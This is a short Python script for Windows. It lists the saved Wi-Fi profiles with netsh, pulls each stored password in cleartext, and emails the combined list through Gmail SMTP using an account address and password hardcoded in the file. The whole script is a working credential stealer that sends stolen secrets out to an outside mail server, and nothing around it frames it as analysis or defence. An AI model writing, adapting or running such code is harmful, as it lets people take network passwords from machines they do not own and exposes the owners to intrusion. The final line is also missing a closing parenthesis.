import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def get_networks_name():
    command = "netsh wlan show profile"
    networks = (subprocess.check_output(command, shell=True)).decode()
    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
    return network_names_list


def get_password(network_names_list):
    result = ""
    for network_name in network_names_list:
        try:
            command = "netsh wlan show profile " + network_name + " key=clear"
            output = (subprocess.check_output(command, shell=True)).decode()
            password = re.findall("(?:Content\s*:\s)(.*)", output)
            if password:
                result += network_name + password[0]
            else:
                result += network_name + "NO PASS"       
        except:
            result += network_name + "ERROR"
        result += "\n------------------------------------------\n"
    return result


if __name__ == '__main__':
    send_mail("smartsecureuniverse@gmail.com", "Sc0 rpi 0n", get_password(get_networks_name())
